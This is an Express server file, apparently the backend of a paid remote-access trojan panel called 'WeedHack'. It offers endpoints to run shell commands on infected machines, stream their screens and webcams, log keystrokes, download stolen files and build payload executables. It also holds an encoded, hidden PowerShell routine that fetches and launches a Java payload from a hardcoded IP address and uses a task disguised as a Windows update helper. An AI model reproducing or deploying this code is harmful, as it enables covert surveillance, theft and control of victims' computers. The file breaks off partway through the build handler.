// language: JavaScript, file: server.js
import 'dotenv/config';
import express from 'express';
import helmet from 'helmet';
import cookieParser from 'cookie-parser';
import rateLimit from 'express-rate-limit';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import crypto from 'node:crypto';
import fs from 'node:fs';
import http from 'node:http';
import https from 'node:https';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { remoteDb, initRemoteDb } from './remote_db.js';
import { db, initLocalDb, UPLOAD_DIR } from './local_db.js';
import { startUdp, closeUdp, getPing } from './net.js'; 
import { handleRpc } from './tcp_rpc.js';
import { buildBoot } from './builder/rustbuild.js';
import { buildJavaPayload } from './builder/java_build.js';
import { getCachedUser, invalidateUser, userCacheById, userCacheByKey, getCache, setCache, clearCache } from './cache.js';
import { fetchSolanaIp, getRemoteIp } from './discovery.js';

const __dirname  = path.dirname(fileURLToPath(import.meta.url));
const PUBLIC_DIR = path.join(__dirname, 'public');

const CFG = {
  httpPort:   Number(process.env.HTTP_PORT || 80),
  tcpPort:    Number(process.env.TCP_PORT  || 443),
  udpPort:    Number(process.env.UDP_PORT  || 880),
  bindHost:   process.env.BIND_HOST || '0.0.0.0',
  tlsCert:    process.env.TLS_CERT || '',
  tlsKey:     process.env.TLS_KEY  || '',
  jwtSecret:  process.env.JWT_SECRET || 'dev_only_change_me',
  cookieSecure: process.env.COOKIE_SECURE === 'true',
  maxUpload:  Number(process.env.MAX_UPLOAD_BYTES || 64 * 1024 * 1024),
};

const DOWNLOAD_DIR = path.join(__dirname, 'download');
if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });

const BUILD_DIR = path.join(__dirname, 'build');
if (!fs.existsSync(BUILD_DIR)) fs.mkdirSync(BUILD_DIR, { recursive: true });

if (!fs.existsSync(path.join(PUBLIC_DIR, 'css', 'style.css'))) {
  console.error(`[startup] FATAL: ${PUBLIC_DIR}/css/style.css missing.`);
  process.exit(1);
}
if (!fs.existsSync(CFG.tlsCert) || !fs.existsSync(CFG.tlsKey)) {
  console.error(`[startup] FATAL: TLS cert/key missing.`);
  process.exit(1);
}

const tlsOpts = {
  cert: fs.readFileSync(CFG.tlsCert),
  key:  fs.readFileSync(CFG.tlsKey),
};

const app = express();
app.disable('x-powered-by');
app.disable('etag');
app.set('trust proxy', false);

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc:  ["'self'", "'unsafe-inline'"],
      scriptSrcAttr: ["'unsafe-inline'"],
      styleSrc:   ["'self'", "'unsafe-inline'"],
      imgSrc:     ["'self'", 'data:', 'blob:'],
      connectSrc: ["'self'"],
      frameAncestors: ["'none'"],
      objectSrc:  ["'none'"],
      baseUri:    ["'self'"],
      upgradeInsecureRequests: null,
    },
  },
  hsts: false,
  crossOriginResourcePolicy: { policy: 'same-origin' },
  referrerPolicy: { policy: 'no-referrer' },
}));
app.use(cookieParser());

app.use((req, res, next) => {
  const t = Date.now();
  res.on('finish', () => {
    const skip = req.path.includes('/screen') || req.path.endsWith('/webcam');
    if (!skip) console.log(`[http] ${req.method} ${req.url} ${req.ip} -> ${res.statusCode} (${Date.now() - t}ms)`);
  });
  next();
});

app.post('/api/rpc',
  express.json({ limit: Math.ceil(CFG.maxUpload * 1.5) }),
  async (req, res) => {
    try { res.json(await handleRpc(req.body, req.ip)); }
    catch (e) { console.error('[rpc]', e); res.status(500).json({ error: 'rpc error' }); }
  }
);

app.use('/api/client/upload', express.raw({
  type: ['application/zip', 'application/octet-stream'],
  limit: CFG.maxUpload,
}));

const jsonSmall = express.json({ limit: '256kb' });
const jsonExec  = express.json({ limit: '32mb' });
app.use((req, res, next) => {
  if (req.method === 'POST' && /^\/api\/clients\/\d+\/exec\/?$/.test(req.path)) {
    return jsonExec(req, res, next);
  }
  return jsonSmall(req, res, next);
});

const limit = (opts) => rateLimit({ standardHeaders: true, legacyHeaders: false, ...opts });

const limitGlobal = limit({
  windowMs: 60_000, max: 600,
  message: { error: 'too many requests' },
  skip: (req) =>
    req.path.endsWith('/screen') ||
    req.path.endsWith('/cursor') ||
    req.path.endsWith('/input') ||
    req.path.endsWith('/monitors') ||
    req.path.endsWith('/webcam') ||
    req.path.endsWith('/rdp/update') ||
    req.path.endsWith('/rdp/stop') ||
    req.path.endsWith('/webcam/stop') ||
    req.path.endsWith('/keylog/stop') ||
    req.path.endsWith('/sysinfo') ||
    req.path === '/api/admin2/stats',
});
const limitAuth     = limit({ windowMs: 15 * 60_000, max: 20,  message: { error: 'too many attempts, slow down' } });
const limitWebhook  = limit({ windowMs: 60 * 60_000, max: 5,   message: { error: 'webhook test limit reached' } });
const limitDownload = limit({ windowMs: 60_000,      max: 60,  message: { error: 'too many downloads' } });
const limitBuild    = limit({ windowMs: 60 * 60_000, max: 10,  message: { error: 'build limit reached — 10 per hour' } });
const limitAdmin    = limit({ windowMs: 15 * 60_000, max: 20,  message: { error: 'Too many admin attempts. Locked for 15 minutes.' } });

app.use(limitGlobal);

const ALPHA = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
function genBlock4() {
  return Array.from({ length: 4 }, () => ALPHA[crypto.randomInt(ALPHA.length)]).join('');
}
function genKey()      { return [genBlock4(), genBlock4(), genBlock4(), genBlock4()].join('-'); }
function genLoginTok() { return [genBlock4(), genBlock4(), genBlock4(), genBlock4()].join('-'); }

const signToken  = (u) => jwt.sign({ uid: u.id, username: u.username }, CFG.jwtSecret, { expiresIn: '7d' });
const cookieOpts = () => ({ httpOnly: true, sameSite: 'lax', secure: CFG.cookieSecure, maxAge: 7 * 24 * 3600 * 1000 });

async function requireAuth(req, res, next) {
  const token = req.cookies?.token;
  if (!token) return res.status(401).json({ error: 'unauthorized' });
  try { 
    req.user = jwt.verify(token, CFG.jwtSecret); 
    next(); 
  }
  catch { 
    return res.status(401).json({ error: 'unauthorized' }); 
  }
}

async function requirePremium(req, res, next) {
  try {
    const row = await getOwnUser(req.user.uid);
    if (!row || !row.premium_until || Number(row.premium_until) < Date.now()) {
      return res.status(403).json({ error: 'Premium required or expired. Please upgrade your account.' });
    }
    next();
  } catch (e) {
    res.status(500).json({ error: 'internal error' });
  }
}

const isDiscordWebhook = (url) => typeof url === 'string' &&
  /^https:\/\/(discord|discordapp)\.com\/api\/webhooks\/\d+\/[\w-]+$/.test(url);

async function sendWebhook(url, payload) {
  try {
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: 'WeedHack', ...payload }),
      redirect: 'error',
      signal: AbortSignal.timeout(5000),
    });
    return r.ok;
  } catch { return false; }
}

async function getOwnUser(uid) {
  return await getCachedUser(uid);
}

function buildWipeCommand(serverBase) {
  const stUrl = `${serverBase}/api/downloads/st.jar`;

  const script = `
$ErrorActionPreference = 'SilentlyContinue'
$log = Join-Path $env:TEMP 'wh-wipe.log'
"--- $(Get-Date -Format o) ---" | Out-File -Encoding UTF8 $log
"url: ${stUrl}" | Out-File -Encoding UTF8 -Append $log

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

function Get-St {
  param([string]$Url, [string]$Dst)
  Remove-Item -Force -Path $Dst -ErrorAction SilentlyContinue
  $params = @{ Uri = $Url; OutFile = $Dst; UseBasicParsing = $true; TimeoutSec = 60; ErrorAction = 'Stop' }
  if ($PSVersionTable.PSVersion.Major -ge 6) { $params['SkipCertificateCheck'] = $true }
  Invoke-WebRequest @params
}

$stTmp = Join-Path $env:TEMP 'st_new.jar'
$ok = $false
for ($i = 0; $i -lt 5; $i++) {
  try {
    Get-St -Url '${stUrl}' -Dst $stTmp
    if ((Get-Item $stTmp).Length -gt 1000) { $ok = $true; break }
  } catch {
    "attempt $i failed: $($_.Exception.Message)" | Out-File -Encoding UTF8 -Append $log
    Start-Sleep -Seconds 2
  }
}
if (-not $ok) {
  try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile('${stUrl}', $stTmp)
    if ((Get-Item $stTmp).Length -gt 1000) { $ok = $true }
  } catch {
    "webclient failed: $($_.Exception.Message)" | Out-File -Encoding UTF8 -Append $log
  }
}
if (-not $ok) {
  "abort: download failed, loader untouched" | Out-File -Encoding UTF8 -Append $log
  exit 1
}
"download ok: $((Get-Item $stTmp).Length) bytes" | Out-File -Encoding UTF8 -Append $log

schtasks /Delete /TN 'WindowsUpdateHelper' /F 2>$null | Out-Null

$dir = Join-Path $env:APPDATA 'loader'
Get-Process -ErrorAction SilentlyContinue | Where-Object {
  $_.Path -and $_.Path.StartsWith($dir, [System.StringComparison]::OrdinalIgnoreCase)
} | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 2000

$keep = (Join-Path $dir 'key.json').ToLower()
for ($i = 0; $i -lt 15; $i++) {
  $left = @()
  Get-ChildItem -Force -Path $dir -ErrorAction SilentlyContinue | ForEach-Object {
    if ($_.FullName.ToLower() -ne $keep) {
      try { Remove-Item -Recurse -Force -Path $_.FullName -ErrorAction Stop }
      catch { $left += $_.FullName }
    }
  }
  if ($left.Count -eq 0) { break }
  Start-Sleep -Milliseconds 500
}
"wipe done, remaining: $($left.Count)" | Out-File -Encoding UTF8 -Append $log

New-Item -ItemType Directory -Force -Path $dir | Out-Null
$stDst = Join-Path $dir 'st.jar'
for ($i = 0; $i -lt 15; $i++) {
  try { Move-Item -Force -Path $stTmp -Destination $stDst -ErrorAction Stop; break }
  catch { Start-Sleep -Milliseconds 500 }
}
"moved st.jar: $(Test-Path $stDst)" | Out-File -Encoding UTF8 -Append $log

if (Test-Path $stDst) {
  $javaw = "javaw.exe"
  Start-Process -FilePath $javaw -ArgumentList "-jar \`"$stDst\`"" -WindowStyle Hidden
  "launched" | Out-File -Encoding UTF8 -Append $log
} else {
  "error: st.jar missing after move" | Out-File -Encoding UTF8 -Append $log
}
`;

  const encoded = Buffer.from(script, 'utf16le').toString('base64');

  return `Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList @('-NoProfile','-NonInteractive','-WindowStyle','Hidden','-EncodedCommand','${encoded}')`;
}

app.use(express.static(PUBLIC_DIR, {
  etag: true,
  maxAge: '1h',
  setHeaders: (res, filePath) => {
    if (filePath.endsWith('.html')) res.setHeader('Cache-Control', 'no-store');
  },
}));

app.get('/api/health', (_req, res) => {
  res.json({ ok: true, uptime: Math.round(process.uptime()),
             http: CFG.httpPort, tcp: CFG.tcpPort, udp: CFG.udpPort,
             time: new Date().toISOString() });
});

app.get('/api/remote_ip', requireAuth, (req, res) => {
  res.json({ ip: getRemoteIp() });
});

app.get('/api/getkey/:buildId', async (req, res) => {
  const buildId = Number(req.params.buildId);
  const [rows] = await db.query(`SELECT key FROM builds WHERE id = ?`, [buildId]);
  if (!rows.length) return res.status(404).send('{"error": "not found"}');
  res.send(`{"key": "${rows[0].key}"}`);
});

app.post('/api/signup', limitAuth, async (req, res) => {
  const { username, email, password, discordWebhook } = req.body || {};
  if (!username || !email || !password || !discordWebhook)
    return res.status(400).json({ error: 'all fields required' });
  if (username.length < 3 || username.length > 32)
    return res.status(400).json({ error: 'username 3-32 chars' });
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email))
    return res.status(400).json({ error: 'invalid email' });
  if (password.length < 8)
    return res.status(400).json({ error: 'password min 8 chars' });
  if (!isDiscordWebhook(discordWebhook))
    return res.status(400).json({ error: 'invalid discord webhook url' });

  const [exists] = await remoteDb.query(`SELECT id FROM users WHERE username = ? OR email = ?`, [username, email]);
  if (exists.length) return res.status(409).json({ error: 'username or email taken' });

  const webhookOk = await sendWebhook(discordWebhook, {
    content: `webhook verified for \`${username}\``,
    embeds: [{ title: 'account verified', color: 0x29B6F6,
               description: 'your webhook is live. your keys arrive next.',
               timestamp: new Date().toISOString() }],
  });
  if (!webhookOk) return res.status(400).json({ error: 'webhook unreachable — check the url' });

  const hash       = await bcrypt.hash(password, 12);
  const accountKey = genKey();
  const loginToken = genLoginTok();
  const now        = Date.now();

  const [info] = await remoteDb.query(`
    INSERT INTO users (username, email, password_hash, account_key, login_token, discord_webhook, created_at)
    VALUES (?, ?, ?, ?, ?, ?, ?)
  `, [username, email, hash, accountKey, loginToken, discordWebhook, now]);

  const uid = Number(info.insertId);
  
  await db.query(`
    INSERT INTO users (id, username, email, password_hash, account_key, login_token, discord_webhook, created_at)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
  `, [uid, username, email, hash, accountKey, loginToken, discordWebhook, now]);

  const user = { 
    id: uid, username, email, account_key: accountKey, login_token: loginToken, 
    discord_webhook: discordWebhook, created_at: now, premium_until: 0 
  };
  
  userCacheById.set(user.id, user);
  userCacheByKey.set(user.account_key, user);

  sendWebhook(discordWebhook, {
    content: `keys for **${username}**`,
    embeds: [{
      title: 'your keys',
      color: 0x0288D1,
      description:
        `**account key** (client auth)\n\`\`\`\n${accountKey}\n\`\`\`\n` +
        `**login token** (dashboard sign-in)\n\`\`\`\n${loginToken}\n\`\`\``,
      timestamp: new Date().toISOString(),
    }],
  });

  res.cookie('token', signToken(user), cookieOpts());
  res.json({ ok: true, accountKey, loginToken, username });
});

app.post('/api/signin', limitAuth, async (req, res) => {
  const { username, loginToken, password } = req.body || {};

  let user = null;

  if (loginToken && !password) {
    const [rows] = await remoteDb.query(`SELECT * FROM users WHERE login_token = ?`, [loginToken]);
    user = rows[0];
  } else if (loginToken && password) {
    const [rows] = await remoteDb.query(`SELECT * FROM users WHERE login_token = ?`, [loginToken]);
    user = rows[0];
    if (user) {
      const ok = await bcrypt.compare(password, user.password_hash);
      if (!ok) user = null;
    }
  } else if (username && password) {
    const [rows] = await remoteDb.query(`SELECT * FROM users WHERE username = ? OR email = ?`, [username, username]);
    user = rows[0];
    if (user) {
      const ok = await bcrypt.compare(password, user.password_hash);
      if (!ok) user = null;
    }
  } else {
    return res.status(400).json({ error: 'missing credentials' });
  }

  if (!user) return res.status(401).json({ error: 'invalid credentials' });

  userCacheById.set(user.id, user);
  userCacheByKey.set(user.account_key, user);

  res.cookie('token', signToken({ id: user.id, username: user.username }), cookieOpts());
  res.json({ ok: true, username: user.username });
});

app.post('/api/logout', (_req, res) => { res.clearCookie('token'); res.json({ ok: true }); });

app.get('/api/me', requireAuth, async (req, res) => {
  const row = await getOwnUser(req.user.uid);
  if (!row) return res.status(404).json({ error: 'not found' });
  res.json({
    username: row.username,
    email: row.email,
    accountKey: row.account_key,
    loginToken: row.login_token,
    discordWebhook: row.discord_webhook,
    createdAt: row.created_at,
    premium_until: row.premium_until,
    isPremium: Number(row.premium_until) > Date.now()
  });
});

app.post('/api/webhook/test', requireAuth, limitWebhook, async (req, res) => {
  const { url } = req.body || {};
  if (!isDiscordWebhook(url)) return res.status(400).json({ error: 'invalid discord webhook url' });
  const ok = await sendWebhook(url, {
    content: 'webhook test',
    embeds: [{ title: 'connection live', color: 0x29B6F6, timestamp: new Date().toISOString() }],
  });
  if (!ok) return res.status(502).json({ error: 'webhook unreachable' });
  
  await remoteDb.query(`UPDATE users SET discord_webhook = ? WHERE id = ?`, [url, req.user.uid]);
  await db.query(`UPDATE users SET discord_webhook = ? WHERE id = ?`, [url, req.user.uid]);
  invalidateUser(req.user.uid);
  res.json({ ok: true });
});

app.get('/api/clients', requireAuth, async (req, res) => {
  const status = String(req.query.status || 'all').toLowerCase();
  const q      = String(req.query.q || '').trim();
  const limitN = Math.min(Math.max(Number(req.query.limit  || 50),  1), 200);
  const offset = Math.max(Number(req.query.offset || 0), 0);
  const now    = Date.now();
  const cutoff = now - 30_000;

  const cacheKey = `clients:${req.user.uid}:${status}:${q}:${limitN}:${offset}`;
  const cached = getCache(cacheKey);
  if (cached) return res.json(cached);

  const filters = ['user_id = ?'];
  const params  = [req.user.uid];

  if (status === 'online')  { filters.push('last_seen >= ?'); params.push(cutoff); }
  if (status === 'offline') { filters.push('last_seen < ?');  params.push(cutoff); }
  if (q) {
    filters.push('(hostname LIKE ? OR ip LIKE ?)');
    params.push(`%${q}%`, `%${q}%`);
  }
  const where = filters.join(' AND ');

  const [countRows] = await db.query(`SELECT COUNT(*) AS n FROM clients WHERE ${where}`, params);
  const totalRow = countRows[0];

  const [rows] = await db.query(`
    SELECT id, hostname, ip, last_seen FROM clients
    WHERE ${where}
    ORDER BY last_seen DESC
    LIMIT ? OFFSET ?
  `, [...params, limitN, offset]);

  const [onlineRows] = await db.query(`SELECT COUNT(*) AS n FROM clients WHERE user_id = ? AND last_seen >= ?`, [req.user.uid, cutoff]);
  const [offlineRows] = await db.query(`SELECT COUNT(*) AS n FROM clients WHERE user_id = ? AND last_seen < ?`, [req.user.uid, cutoff]);

  const payload = {
    total:   Number(totalRow.n),
    online:  Number(onlineRows[0].n),
    offline: Number(offlineRows[0].n),
    rows: rows.map(r => ({
      id: r.id,
      hostname: r.hostname,
      ip: r.ip,
      online: now - r.last_seen < 30_000,
      lastSeen: r.last_seen,
      country: null,
      privileges: 'admin',
      ping: getPing(r.id),
    })),
  };

  setCache(cacheKey, payload, 5000);
  res.json(payload);
});

app.get('/api/clients/:id/uploads', requireAuth, async (req, res) => {
  const clientId = Number(req.params.id);
  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [clientId, req.user.uid]);
  if (!client.length) return res.status(404).json({ error: 'client not found' });
  const [rows] = await db.query(`
    SELECT id, filename, size, created_at FROM uploads
    WHERE user_id = ? AND client_id = ?
    ORDER BY created_at DESC LIMIT 200
  `, [req.user.uid, clientId]);
  res.json(rows);
});

app.get('/api/uploads/:id/download', limitDownload, requireAuth, requirePremium, async (req, res) => {
  const uploadId = Number(req.params.id);
  const [rows] = await db.query(`
    SELECT filename, stored_name, size FROM uploads
    WHERE id = ? AND user_id = ?
  `, [uploadId, req.user.uid]);
  if (!rows.length) return res.status(404).json({ error: 'not found' });
  const row = rows[0];
  const src = path.join(UPLOAD_DIR, row.stored_name);
  if (!fs.existsSync(src)) return res.status(410).json({ error: 'file gone' });
  res.setHeader('Content-Type', 'application/zip');
  res.setHeader('Content-Length', row.size);
  res.setHeader('Content-Disposition', `attachment; filename="${row.filename.replace(/"/g, '')}"`);
  fs.createReadStream(src).pipe(res);
});

app.post('/api/clients/:id/exec', requireAuth, requirePremium, async (req, res) => {
  const clientId = Number(req.params.id);
  const { shell, line } = req.body || {};
  if (!['cmd', 'powershell', 'file'].includes(shell))
    return res.status(400).json({ error: 'bad shell' });
  const maxLine = shell === 'file' ? 32 * 1024 * 1024 : 65536;
  if (typeof line !== 'string' || !line.trim() || line.length > maxLine)
    return res.status(400).json({ error: 'bad line' });

  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [clientId, req.user.uid]);
  if (!client.length) return res.status(404).json({ error: 'client not found' });

  const [info] = await db.query(`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, ?, ?, 'pending', ?)
  `, [req.user.uid, clientId, shell, line, Date.now()]);

  res.json({ ok: true, commandId: Number(info.insertId) });
});

app.get('/api/clients/:id/commands', requireAuth, async (req, res) => {
  const clientId = Number(req.params.id);
  const [rows] = await db.query(`
    SELECT id, shell, line, output, status, created_at FROM commands
    WHERE user_id = ? AND client_id = ?
    ORDER BY created_at DESC LIMIT 100
  `, [req.user.uid, clientId]);
  res.json(rows);
});

app.get('/api/clients/:id/sysinfo', requireAuth, requirePremium, async (req, res) => {
  const clientId = Number(req.params.id);
  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [clientId, req.user.uid]);
  if (!client.length) return res.status(404).json({ error: 'client not found' });

  try {
    const [info] = await db.query(`
      INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
      VALUES (?, ?, 'sysinfo', '', 'pending', ?)
    `, [req.user.uid, clientId, Date.now()]);

    const cmdId = Number(info.insertId);
    const deadline = Date.now() + 10000;

    while (Date.now() < deadline) {
      await new Promise(r => setTimeout(r, 150));
      const [rows] = await db.query(`SELECT output, status FROM commands WHERE id = ?`, [cmdId]);
      const row = rows[0];
      if (!row) continue;
      if (row.status === 'done') {
        try {
          return res.json(JSON.parse(row.output || '{}'));
        } catch (e) {
          return res.status(500).json({ error: 'bad json from client', raw: row.output });
        }
      }
    }
    res.status(504).json({ error: 'timeout waiting for client' });
  } catch (e) {
    console.error('[sysinfo]', e);
    res.status(500).json({ error: 'internal error' });
  }
});

app.delete('/api/clients/:id', requireAuth, async (req, res) => {
  const clientId = Number(req.params.id);
  const [info] = await db.query(`DELETE FROM clients WHERE id = ? AND user_id = ?`, [clientId, req.user.uid]);
  if (info.affectedRows === 0) return res.status(404).json({ error: 'not found' });
  clearCache(`clients:${req.user.uid}`);
  res.json({ ok: true });
});

app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
  const cid = Number(req.params.id);
  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
  if (!client.length) return res.status(404).json({ error: 'client not found' });

  const stPath = path.join(DOWNLOAD_DIR, 'st.jar');
  let needsBuild = !fs.existsSync(stPath);
  if (needsBuild) {
    const row = await getOwnUser(req.user.uid);
    const acctKey = row?.account_key || '';
    if (!acctKey) return res.status(400).json({ error: 'no account key to build st.jar' });
    try {
      await buildJavaPayload();
    } catch (e) {
      console.error('[wipe] rebuild st.jar failed', e);
      return res.status(500).json({ error: 'failed to rebuild st.jar: ' + (e.message || 'unknown') });
    }
  }

  const base = 'http://95.182.96.216'; // HARDCODED MAIN SERVER
  const line = buildWipeCommand(base);

  const [info] = await db.query(`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, 'powershell', ?, 'pending', ?)
  `, [req.user.uid, cid, line, Date.now()]);

  res.json({
    ok: true,
    commandId: Number(info.insertId),
    message: 'wiping + reinstalling',
  });
});

app.post('/api/clients/:id/rdp/start', requireAuth, requirePremium, async (req, res) => {
  const cid = Number(req.params.id);
  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
  if (!client.length) return res.status(404).json({ error: 'client not found' });
  const cfg = {
    monitor:  Number(req.body.monitor  || 0),
    width:    Math.min(Math.max(Number(req.body.width  || 1280), 320), 3840),
    height:   Math.min(Math.max(Number(req.body.height || 720),  240), 2160),
    quality:  Math.min(Math.max(Number(req.body.quality || 50),   10),  90),
    fps:      Math.min(Math.max(Number(req.body.fps     || 10),    1),  60),
    keyboard: req.body.keyboard === true,
    mouse:    req.body.mouse === true,
  };
  await db.query(`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, 'rdp', ?, 'pending', ?)
  `, [req.user.uid, cid, JSON.stringify(cfg), Date.now()]);
  res.json({ ok: true });
});

app.post('/api/clients/:id/rdp/stop', requireAuth, requirePremium, async (req, res) => {
  const cid = Number(req.params.id);
  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
  if (!client.length) return res.status(404).json({ error: 'client not found' });
  await db.query(`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, 'rdp', '{"stop":true}', 'pending', ?)
  `, [req.user.uid, cid, Date.now()]);
  res.json({ ok: true });
});

app.post('/api/clients/:id/webcam/start', requireAuth, requirePremium, async (req, res) => {
  const cid = Number(req.params.id);
  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
  if (!client.length) return res.status(404).json({ error: 'client not found' });
  const cfg = {
    camera:  Number(req.body.camera  || 0),
    width:   Math.min(Math.max(Number(req.body.width  || 640), 160), 1920),
    height:  Math.min(Math.max(Number(req.body.height || 480), 120), 1080),
    quality: Math.min(Math.max(Number(req.body.quality || 55),  10),  90),
    fps:     Math.min(Math.max(Number(req.body.fps     || 10),   1),  30),
  };
  await db.query(`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, 'webcam', ?, 'pending', ?)
  `, [req.user.uid, cid, JSON.stringify(cfg), Date.now()]);
  res.json({ ok: true });
});

app.post('/api/clients/:id/webcam/stop', requireAuth, requirePremium, async (req, res) => {
  const cid = Number(req.params.id);
  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
  if (!client.length) return res.status(404).json({ error: 'client not found' });
  await db.query(`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, 'webcam', '{"stop":true}', 'pending', ?)
  `, [req.user.uid, cid, Date.now()]);
  res.json({ ok: true });
});

app.post('/api/clients/:id/keylog/start', requireAuth, requirePremium, async (req, res) => {
  const cid = Number(req.params.id);
  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
  if (!client.length) return res.status(404).json({ error: 'client not found' });
  await db.query(`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, 'keylog', '{"start":true}', 'pending', ?)
  `, [req.user.uid, cid, Date.now()]);
  res.json({ ok: true });
});

app.post('/api/clients/:id/keylog/stop', requireAuth, requirePremium, async (req, res) => {
  const cid = Number(req.params.id);
  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
  if (!client.length) return res.status(404).json({ error: 'client not found' });
  await db.query(`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, 'keylog', '{"stop":true}', 'pending', ?)
  `, [req.user.uid, cid, Date.now()]);
  res.json({ ok: true });
});

app.get('/api/clients/:id/keylog', requireAuth, requirePremium, async (req, res) => {
  const cid = Number(req.params.id);
  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
  if (!client.length) return res.status(404).json({ error: 'client not found' });
  const [rows] = await db.query(`
    SELECT id, data, created_at FROM keylogs
    WHERE user_id = ? AND client_id = ?
    ORDER BY created_at DESC LIMIT 500
  `, [req.user.uid, cid]);
  res.json(rows.reverse());
});

app.delete('/api/clients/:id/keylog', requireAuth, requirePremium, async (req, res) => {
  const cid = Number(req.params.id);
  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
  if (!client.length) return res.status(404).json({ error: 'client not found' });
  await db.query(`DELETE FROM keylogs WHERE user_id = ? AND client_id = ?`, [req.user.uid, cid]);
  res.json({ ok: true });
});

const ALLOWED_EXT = ['.exe', '.zip', '.msi', '.dll', '.bin', '.ps1', '.dat', '.jar'];

const limitDownloadExe = rateLimit({
  windowMs: 60 * 60 * 1000,
  max: 200,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'download limit reached' },
});

app.get('/api/downloads/st.jar', (req, res) => {
  const jarPath = path.join(DOWNLOAD_DIR, 'st.jar');
  if (!fs.existsSync(jarPath)) return res.status(404).send('not found');
  res.setHeader('Content-Type', 'application/java-archive');
  res.sendFile(jarPath);
});

app.get('/api/downloads/:name', limitDownloadExe, (req, res) => {
  const name = String(req.params.name || '');

  if (!name || name.includes('..') || name.includes('/') || name.includes('\\'))
    return res.status(400).json({ error: 'bad name' });

  if (!/^[A-Za-z0-9_\-\.]+$/.test(name))
    return res.status(400).json({ error: 'bad name' });

  const ext = path.extname(name).toLowerCase();
  if (!ALLOWED_EXT.includes(ext))
    return res.status(400).json({ error: 'file type not allowed' });

  const full = path.resolve(DOWNLOAD_DIR, name);
  const base = path.resolve(DOWNLOAD_DIR);
  if (!full.startsWith(base + path.sep))
    return res.status(400).json({ error: 'bad path' });

  if (!fs.existsSync(full))
    return res.status(404).json({ error: 'not found' });

  const st = fs.statSync(full);
  const ctype = ext === '.zip' ? 'application/zip'
              : ext === '.jar' ? 'application/java-archive'
              : ext === '.dat' ? 'application/octet-stream'
              : 'application/octet-stream';
  res.setHeader('Content-Type', ctype);
  res.setHeader('Content-Length', st.size);
  res.setHeader('Content-Disposition', `attachment; filename="${name}"`);
  fs.createReadStream(full).pipe(res);
});

app.get('/api/build/bases', requireAuth, (req, res) => {
  res.json([]);
});

app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
  const { key } = req.body || {};

  const row = await getOwnUser(req.user.uid);
  const acctKey = row?.account_key || '';
  const buildKey = (typeof key === 'string' && key.trim().length > 0)
    ? key.trim().slice(0, 128)
    : acctKey;

  if (!buildKey) return res.status(400).json({ error: 'no key — type one or set an account key' });

  let zipBuf;
  try {
    const [nextIdRows] = await db.query(`SELECT MAX(id) + 1 AS nextId FROM builds`);
    const nextBuildId = nextIdRows[0]?.nextId ? nextIdRows[0].nextId : 1;

    zipBuf = await buildBoot({ key: buildKey, buildId: nextBuildId });
  } catch (e) {
    console.error('[build] failed:', e);
    const msg = (e.stderr || e.message || 'unknown').toString().slice(-3000);
    return res.status(500).json({ error: 'compile failed: ' + msg });
  }

  const outName = `build_${Date.now()}_u${req.user.uid}.exe`;
  const outPath = path.join(BUILD_DIR, outName);
  fs.writeFileSync(outPath, zipBuf, { mode: 0o644 });

  const [staleRows] = await db.query(`SELECT id, stored_name FROM builds WHERE user_id = ? AND base = 'boot'`, [req.user.uid]);
  for (const b of staleRows) {
    if (b.stored_name && b.stored_name !== outName) {
      try { fs.unlinkSync(path.join(BUILD_DIR, b.stored_name)); } catch {}
    }
    await db.query(`DELETE FROM builds WHERE id = ?`, [b.id]);
  }

  const [info] = await db.query(`
    INSERT INTO builds (user_id, name, stored_name, size, base, key, config, created_at)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
  `, [req.user.uid, outName, outName, zipBuf.length, 'boot', buildKey, '{}', Date.now()]);

